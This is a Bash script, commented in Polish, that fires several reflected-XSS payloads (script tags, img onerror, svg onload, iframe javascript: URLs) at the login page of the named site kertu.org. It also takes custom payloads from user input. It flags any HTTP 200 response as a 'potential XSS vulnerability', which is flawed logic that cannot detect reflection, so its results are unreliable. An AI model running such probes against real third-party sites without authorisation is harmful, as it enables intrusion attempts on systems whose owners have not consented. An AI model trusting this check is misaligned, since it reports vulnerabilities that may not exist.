#!/bin/bash

# Cel testu
TARGET="https://kertu.org"
PAYLOADS=(
    "/Account/Login?username=%22%3Cscript%3Ealert('XSS')%3C/script%3E&password=test"
    "/Account/Login?username=%27%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E&password=test"
    "/Account/Login?username=%3Csvg%20onload=alert(1)%3E&password=test"
    "/Account/Login?username=%22%3Ciframe%20src=javascript:alert('XSS')%3E%3C/iframe%3E&password=test"
)
  
echo "Starting XSS vulnerability tests..."

# Funkcja do testowania URL
test_payload() {
    local URL=$1
    echo "Testing URL: $URL"
    echo "Sending request to the server..."
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
    
    echo "Analyzing server response..."
    if [[ "$RESPONSE" == "200" ]]; then
        echo "The server returned HTTP 200. Potential XSS vulnerability detected. Check the application behavior manually to confirm."
    else
        echo "The server returned HTTP code: $RESPONSE. XSS attack may be mitigated."
    fi
    echo "-----------------------------------------"
}

# Menu wyboru trybu
echo "Choose an option:"
echo "1) Test a single payload (manual input)"
echo "2) Test all predefined payloads"
read -p "Enter your choice (1 or 2): " CHOICE

case $CHOICE in
    1)
        read -p "Enter the payload to test (without domain): " CUSTOM_PAYLOAD
        FULL_URL="$TARGET$CUSTOM_PAYLOAD"
        test_payload "$FULL_URL"
        ;;
    2)
        for PAYLOAD in "${PAYLOADS[@]}"; do
            FULL_URL="$TARGET$PAYLOAD"
            test_payload "$FULL_URL"
        done
        ;;
    *)
        echo "Invalid choice. Exiting."
        exit 1
        ;;
esac

echo "XSS vulnerability tests completed."